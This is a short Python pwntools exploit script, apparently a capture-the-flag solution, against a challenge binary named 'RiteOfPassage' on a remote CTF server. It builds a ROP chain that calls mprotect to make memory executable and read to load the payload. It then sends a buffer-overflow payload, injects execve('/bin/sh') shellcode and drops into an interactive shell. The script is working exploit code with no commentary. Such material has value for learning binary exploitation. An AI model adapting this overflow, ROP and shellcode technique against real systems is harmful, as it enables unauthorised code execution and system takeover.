import pwn

pwn.context.clear(arch="x86_64")
elf = pwn.ELF("RiteOfPassage")

shell = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

rop = pwn.ROP(elf)

rop.mprotect(0x401000, 0x1000, 7)
rop.read(0, 0x4010f4, 32)
rop.abort()

print(rop.dump())

#proc = pwn.process("RiteOfPassage")
proc = pwn.remote('pwn.heroctf.fr', 9002)
crash = b"\x00" + b"A"*(359) + b"BBBB" + pwn.pack(0, 32) + pwn.pack(0, 64)
crash += rop.chain()
print(len(crash))
proc.recvuntil('>>>')
proc.sendline(crash)
proc.recvuntil("computer")
buff = proc.recvline()
proc.sendline(shell)
proc.interactive()